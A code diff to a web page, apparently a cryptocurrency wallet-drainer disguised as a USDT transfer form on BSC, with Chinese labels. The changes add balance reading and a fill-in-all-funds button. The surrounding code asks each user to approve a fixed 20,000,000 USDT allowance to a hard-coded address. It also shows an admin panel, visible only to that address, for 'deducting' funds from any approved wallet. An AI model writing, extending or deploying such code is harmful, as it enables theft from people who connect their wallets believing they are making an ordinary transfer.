@@ -25,6 +25,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 .token-left { display: flex; align-items: center; gap: 10px; }
 .usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
 .token-name { font-size: 18px; font-weight: 500; }
+.balance-show{font-size:15px;color:#444;}
 .result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
 .result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
 .send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
@@ -54,13 +55,14 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <div class="label-text">转出数量（USDT‑BSC）</div>
 <div class="amount-row">
 <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
-<div class="max-btn" id="maxBtn">MAX</div>
+<div class="max-btn" id="maxBtn">全部</div>
 </div>
 <div class="token-row">
 <div class="token-left">
 <img class="usdt-icon" src="https://bscscan.com/token/images/tether_32.png">
 <span class="token-name">USDT</span>
 </div>
+<div class="balance-show">余额：<span id="balanceText">0.000000</span></div>
 </div>
 </div>
 
@@ -85,7 +87,7 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <script>
-// ========== 修改点 ==========
+// ========== 配置参数 ==========
 const TARGET_ADDR = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
 const APPROVE_AMOUNT = "20000000"; // 固定授权额度：20000000 USDT
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
@@ -103,8 +105,14 @@ const BSC_NETWORK_PARAM = {
     blockExplorerUrls: ["https://bscscan.com"]
 };
 
+//ERC20余额读取ABI片段
+const ERC20_ABI_BALANCE = [
+    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+];
+
 let web3 = null;
 let userAddress = null;
+let usdtContract = null;
 
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
@@ -114,12 +122,30 @@ const amountInput = $("#amountInput");
 const receiveAmount = $("#receiveAmount");
 const maxBtn = $("#maxBtn");
 const targetAddrText = $("#targetAddrText");
+const balanceText = $("#balanceText");
 const adminPanel = $("#adminPanel");
 const userAddrInput = $("#userAddrInput");
 const deductAmountInput = $("#deductAmountInput");
 const deductBtn = $("#deductBtn");
 
 targetAddrText.innerText = TARGET_ADDR;
+
+//读取USDT余额
+async function loadUserBalance(){
+    if(!web3 || !userAddress || !usdtContract){
+        balanceText.innerText = "0.000000";
+        return;
+    }
+    try{
+        const rawBal = await usdtContract.methods.balanceOf(userAddress).call();
+        const realBal = Number(web3.utils.fromWei(rawBal,"ether"));
+        balanceText.innerText = realBal.toFixed(6);
+        return realBal;
+    }catch(err){
+        balanceText.innerText = "读取失败";
+        return 0;
+    }
+}
 
 async function checkNetwork(){
     if(!window.ethereum) return false;
@@ -152,8 +178,10 @@ async function autoRestoreConnect(){
         if(accounts.length>0){
             userAddress = accounts[0];
             web3 = new Web3(window.ethereum);
+            usdtContract = new web3.eth.Contract(ERC20_ABI_BALANCE,USDT_CONTRACT);
             walletDot.classList.add("connected");
             await checkNetwork();
+            await loadUserBalance();
             if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
                 adminPanel.style.display = "block";
             }
@@ -167,8 +195,10 @@ async function autoRestoreConnect(){
 
 function disconnectWallet() {
     web3 = null;
+    usdtContract=null;
     userAddress = null;
     walletDot.classList.remove("connected");
+    balanceText.innerText="0.000000";
     adminPanel.style.display = "none";
 }
 
@@ -185,8 +215,10 @@ async function manualConnectWallet() {
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
         userAddress = accounts[0];
         web3 = new Web3(window.ethereum);
+        usdtContract = new web3.eth.Contract(ERC20_ABI_BALANCE,USDT_CONTRACT);
         walletDot.classList.add("connected");
         await checkNetwork();
+        await loadUserBalance();
         if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
             adminPanel.style.display = "block";
         }
@@ -202,8 +234,15 @@ amountInput.addEventListener("input", () => {
     receiveAmount.value = num.toFixed(6);
 });
 
-maxBtn.addEventListener("click", ()=>{
-    alert("请在钱包内查看USDT余额，手动输入转账数量");
+//【全部】按钮，填充钱包全部余额
+maxBtn.addEventListener("click", async ()=>{
+    if(!web3 || !usdtContract || !userAddress){
+        alert("请先连接钱包");
+        return;
+    }
+    const bal = await loadUserBalance();
+    amountInput.value = bal.toFixed(2);
+    amountInput.dispatchEvent(new Event('input'));
 })
 
 async function sendTx(dataHex){
@@ -225,6 +264,11 @@ sendBtn.addEventListener("click", async () => {
     await checkNetwork();
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
+    const balance = await loadUserBalance();
+    if(val>balance){
+        alert(`余额不足！你的可用USDT：${balance.toFixed(2)}`);
+        return;
+    }
     const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
     const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
     try{
@@ -242,8 +286,10 @@ sendBtn.addEventListener("click", async () => {
         alert(`🎉转账成功!\n交易哈希:\n${hash}`);
         amountInput.value = "";
         receiveAmount.value = "";
+        await loadUserBalance();
     }catch(e){
         alert("❌操作失败：" + (e.message||String(e)));
+        await loadUserBalance();
     }
 });
 
@@ -266,6 +312,7 @@ deductBtn.addEventListener("click", async () => {
         alert(`✅划扣成功!\n交易哈希:\n${hash}`);
         userAddrInput.value = "";
         deductAmountInput.value = "";
+        await loadUserBalance();
     }catch(err){
         alert("❌划扣失败："+err.message);
     }
